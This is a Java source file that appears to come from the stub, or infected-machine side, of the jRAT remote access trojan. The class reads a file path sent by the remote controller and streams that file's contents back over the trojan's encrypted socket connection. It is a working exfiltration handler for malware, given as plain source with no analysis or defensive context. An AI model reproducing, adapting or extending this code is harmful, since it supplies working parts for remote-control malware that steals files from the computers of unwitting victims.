package se.jrat.stub.packets.incoming;

import java.io.File;

import se.jrat.common.io.FileIO;
import se.jrat.stub.Connection;
import se.jrat.stub.Main;
import se.jrat.stub.packets.outgoing.Packet29ClientUploadFile;


public class Packet21ClientUploadFile extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		File file = new File(Connection.readLine());

		if (file.exists() && file.isFile()) {
			Connection.addToSendQueue(new Packet29ClientUploadFile(file.getName(), file.getAbsolutePath()));

			FileIO fileio = new FileIO();
			fileio.writeFile(file, Connection.socket, Connection.dos, Connection.dis, null, Main.getKey());

			Connection.lock();
		}
	}

}
